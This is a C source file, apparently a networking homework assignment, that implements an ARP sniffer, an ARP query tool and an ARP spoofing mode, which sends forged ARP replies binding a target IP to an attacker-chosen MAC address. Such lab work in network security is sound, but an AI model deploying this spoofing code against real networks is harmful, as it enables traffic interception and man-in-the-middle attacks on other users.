#include <netinet/if_ether.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h> 

#include "arp.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>

/*
 * Change "enp2s0f5" to your device name (e.g. "eth0"), when you test your hoework.
 * If you don't know your device name, you can use "ifconfig" command on Linux.
 * You have to use "enp2s0f5" when you ready to upload your homework.
 */
// #define DEVICE_NAME "enp2s0f5"
#define DEVICE_NAME "h1-eth0"
// #define DEVICE_NAME "eno1"

#define RED "\x1B[31m"
#define GRN "\x1B[32m"
#define YEL "\x1B[33m"
#define BLU "\x1B[34m"
#define MAG "\x1B[35m"
#define CYN "\x1B[36m"
#define WHT "\x1B[37m"
#define RESET "\x1B[0m"

enum cmd
{
	LIST_ALL,
	LIST_TARGET,
	QUERY,
	SPOOF
};

struct arp_packet packet;

void get_my_mac(unsigned char *my_mac)
{
	struct ifreq s;
	int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

	strcpy(s.ifr_name, DEVICE_NAME);
	if (0 == ioctl(fd, SIOCGIFHWADDR, &s))
	{
		int i;
		for (i = 0; i < 6; ++i)
			my_mac[i] = (unsigned char)s.ifr_addr.sa_data[i];
	}
	close(fd);
}

void get_my_ip(unsigned char *my_ip)
{
	int fd;
	struct ifreq ifr;

	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;

	strncpy(ifr.ifr_name, DEVICE_NAME, IFNAMSIZ - 1);

	ioctl(fd, SIOCGIFADDR, &ifr);

	close(fd);

	strcpy(my_ip, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
}

void set_fake_mac(unsigned char *fake_mac, char *mac)
{
	int arr[6];

	sscanf(mac, "%02x:%02x:%02x:%02x:%02x:%02x",
		   &arr[0], &arr[1], &arr[2],
		   &arr[3], &arr[4], &arr[5]);

	for (int i = 0; i < 6; ++i)
	{
		fake_mac[i] = arr[i];
	}
	// print_mac(fake_mac);
}

void print_who_has(int mode)
{
	char target_ip[16];
	char src_ip[16];
	sprintf(target_ip, "%d.%d.%d.%d",
			packet.arp.arp_tpa[0], packet.arp.arp_tpa[1],
			packet.arp.arp_tpa[2], packet.arp.arp_tpa[3]);
	sprintf(src_ip, "%d.%d.%d.%d",
			packet.arp.arp_spa[0], packet.arp.arp_spa[1],
			packet.arp.arp_spa[2], packet.arp.arp_spa[3]);
	if (mode != LIST_TARGET)
		printf("Get ARP packet - Who has %s ?                   Tell %s\n",
			   target_ip,
			   src_ip);
	else
		printf("Get ARP packet - Who has " YEL "%s" RESET " ?                   Tell %s\n",
			   target_ip,
			   src_ip);
}

void print_mac(unsigned char *mac)
{
	printf("mac is: %02x:%02x:%02x:%02x:%02x:%02x\n",
		   mac[0], mac[1], mac[2],
		   mac[3], mac[4], mac[5]);
}

void sniff(int sockfd, int mode, char *str_target_ip)
{
	struct in_addr target_ip;

	inet_pton(AF_INET, str_target_ip, &target_ip);

	while (1)
	{
		recvfrom(sockfd, &packet, sizeof(struct arp_packet), 0, 0, 0);

		// hardware type
		if (packet.eth_hdr.ether_type != htons(ETHERTYPE_ARP))
			continue;

		// protocol type
		if (packet.arp.arp_pro != htons(ETHERTYPE_IP))
			continue;

		switch (mode)
		{
		case LIST_TARGET:
			if (ntohs(packet.arp.arp_op) != ARPOP_REQUEST)
				continue;
			// check is target?
			if (*(unsigned int *)packet.arp.arp_tpa != target_ip.s_addr)
				continue;
			break;
		case QUERY:
			if (ntohs(packet.arp.arp_op) != ARPOP_REPLY)
				continue;
			// check is target?
			if (*(unsigned int *)packet.arp.arp_spa != target_ip.s_addr)
				continue;
			break;
		default:
			break;
		}

		break;
	}
}

void send_arp(int sockfd, int mode, struct sockaddr_ll *sa, u_char *source_mac, u_char *target_mac, char *str_source_ip, char *str_target_ip)
{
	struct arp_packet arp_send;
	struct sockaddr_in dst;
	dst.sin_family = AF_INET;

	// ethernet packet
	// set mac address
	memcpy(arp_send.eth_hdr.ether_shost, source_mac, 6);
	memcpy(arp_send.eth_hdr.ether_dhost, target_mac, 6);
	// ether type
	arp_send.eth_hdr.ether_type = htons(ETHERTYPE_ARP);

	// arp packet
	// set hardware type
	arp_send.arp.arp_hrd = htons(ARPHRD_ETHER);
	// set protocol type
	arp_send.arp.arp_pro = htons(ETHERTYPE_IP);
	// set address len
	arp_send.arp.arp_hln = 6;
	arp_send.arp.arp_pln = 4;
	// set arp operation
	if (mode == QUERY)
		arp_send.arp.arp_op = htons(ARPOP_REQUEST);
	else
		arp_send.arp.arp_op = htons(ARPOP_REPLY);
	// set mac
	memcpy(arp_send.arp.arp_sha, source_mac, 6);
	memcpy(arp_send.arp.arp_tha, target_mac, 6);
	// set ip
	inet_pton(AF_INET, str_source_ip, &dst.sin_addr);
	memcpy(arp_send.arp.arp_spa, &dst.sin_addr.s_addr, 4);
	inet_pton(AF_INET, str_target_ip, &dst.sin_addr);
	memcpy(arp_send.arp.arp_tpa, &dst.sin_addr.s_addr, 4);

	sendto(sockfd, &arp_send, sizeof(arp_send), 0, (struct sockaddr *)&*sa, sizeof(*sa));
}

/*
 * You have to open two socket to handle this program.
 * One for input , the other for output.
 */

int main(int argc, unsigned char *argv[])
{
	int sockfd_recv = 0, sockfd_send = 0;
	struct sockaddr_ll sa;
	struct ifreq req;
	unsigned char my_mac[6];
	unsigned char braodcast_mac[6] = {255, 255, 255, 255, 255, 255};
	unsigned char fake_mac[6];
	// struct in_addr myip;
	struct in_addr target_ip;
	unsigned char my_ip[16];
	int sll_ifindex;

	// Open a recv socket in data-link layer.
	if ((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		perror("open recv socket error");
		exit(1);
	}

	/*
	 * Use recvfrom function to get packet.
	 * recvfrom( ... )
	 */

	// Open a send socket in data-link layer.
	if ((sockfd_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		perror("open send socket error");
		exit(sockfd_send);
	}

	strcpy(req.ifr_ifrn.ifrn_name, DEVICE_NAME);

	// get interface number & set sa
	if (ioctl(sockfd_send, SIOCGIFINDEX, &req) == -1)
		perror("ioctl error."), exit(1);
	bzero(&sa, sizeof(sa));
	sll_ifindex = req.ifr_ifru.ifru_ivalue;
	sa.sll_family = AF_PACKET;
	sa.sll_ifindex = sll_ifindex;

	printf("[ARP sniffer and spoof program ]\n");

	if (geteuid() != 0)
	{
		printf("ERROR: You must be root to use this tool!\n");
		return 1;
	}
	else if (strcmp(argv[1], "-help") == 0)
	{
		printf("Format :\n");
		printf("1) ./arp -l -a\n");
		printf("2) ./arp -l <filter_ip_address>\n");
		printf("3) ./arp -q <query_ip_address>\n");
		printf("4) ./arp <fake_mac_address> <target_ip_address>\n");
	}
	else if (strcmp(argv[1], "-l") == 0)
	{
		printf("### ARP sniffer mode ###\n");

		while (1)
		{
			if (strcmp(argv[2], "-a") == 0)
			{
				sniff(sockfd_recv, LIST_ALL, "");
				print_who_has(LIST_ALL);
			}
			else
			{
				sniff(sockfd_recv, LIST_TARGET, argv[2]);
				print_who_has(LIST_TARGET);
			}
		}
	}
	else if (strcmp(argv[1], "-q") == 0)
	{
		printf("### ARP query mode ###\n");

		get_my_mac(&my_mac);
		get_my_ip(&my_ip);
		send_arp(
			sockfd_send,
			QUERY,
			&sa,
			my_mac,
			braodcast_mac,
			my_ip,
			argv[2]);

		sniff(sockfd_recv, QUERY, argv[2]);

		printf("MAC Address of %s is %02x:%02x:%02x:%02x:%02x:%02x\n",
			   argv[2],
			   packet.arp.arp_sha[0], packet.arp.arp_sha[1], packet.arp.arp_sha[2],
			   packet.arp.arp_sha[3], packet.arp.arp_sha[4], packet.arp.arp_sha[5]);
	}
	else
	{
		printf("### ARP spoof mode ###\n");

		get_my_mac(&my_mac);
		get_my_ip(&my_ip);
		set_fake_mac(&fake_mac, argv[1]);

		sniff(sockfd_recv, LIST_TARGET, argv[2]);

		print_who_has(SPOOF);

		char target[16];
		sprintf(target, "%d.%d.%d.%d",
				packet.arp.arp_spa[0],
				packet.arp.arp_spa[1],
				packet.arp.arp_spa[2],
				packet.arp.arp_spa[3]);

		send_arp(
			sockfd_send,
			SPOOF,
			&sa, 
			fake_mac,
			packet.arp.arp_sha,
			argv[2],
			target);

		printf("Sent ARP Reply : %s is  %s ", argv[2], argv[1]);
        printf("Send successful.\n");
	}

	/*
	 * Use ioctl function binds the send socket and the Network Interface Card.
`	 * ioctl( ... )
	 */

	// Fill the parameters of the sa.

	/*
	 * use sendto function with sa variable to send your packet out
	 * sendto( ... )
	 */

	return 0;
}
